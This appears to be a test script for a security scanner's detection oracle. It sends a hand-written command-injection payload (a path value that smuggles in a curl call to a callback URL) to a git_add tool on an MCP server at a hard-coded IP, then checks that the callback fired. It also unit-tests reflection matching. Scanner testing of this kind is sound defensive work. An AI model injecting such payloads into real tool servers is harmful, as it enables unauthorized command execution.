"""Oracle self-check (temporary scaffold, not detection logic; hand-written payloads only verify the oracle plumbing).

- OOB: real end-to-end — send one command-injection payload to a git target (example); the oracle should find the callback and judge "confirmed".
- Reflection: unit check — feed observe_response text with/without the marker, verifying the matching logic.
"""
from calchas.driver import call_tool_sync
from calchas.oracle import CONFIRMED, NOT_TRIGGERED, Oracle

GIT = "http://43.133.80.249:20001/mcp"   # test case (example), not part of any detection logic

oracle = Oracle()

print("===== OOB channel: real end-to-end =====")
p = oracle.new_probe("oob", meta={"tool": "git_add", "param": "path"})
payload = f'x" ; curl -s {p.embed} ; echo "'      # hand-written scaffold
p.meta["payload"] = payload
print("probe token:", p.token, "| callback:", p.embed)
resp = call_tool_sync(GIT, "git_add", {"path": payload, "files": "."})
print("tool returned:", (resp["text"] or "")[:100].replace("\n", " "))
hits = oracle.poll([p])
f = oracle.verdict(p, hits.get(p.token))
print("verdict:", f.status, "| evidence:", f.evidence)
print("repro:", f.repro)
assert f.status == CONFIRMED, "OOB end-to-end not confirmed"

print("\n===== reflection channel: unit check =====")
p2 = oracle.new_probe("reflection", meta={"tool": "x", "param": "y"})
hit_yes = oracle.observe_response(p2, f"some output {p2.embed} trailing")
hit_no = oracle.observe_response(p2, "nothing relevant here")
print("with marker  ->", oracle.verdict(p2, hit_yes).status, "| snippet:", (hit_yes.evidence if hit_yes else None))
print("without marker ->", oracle.verdict(p2, hit_no).status)
assert oracle.verdict(p2, hit_yes).status == CONFIRMED
assert oracle.verdict(p2, hit_no).status == NOT_TRIGGERED

print("\nall passed ✅")
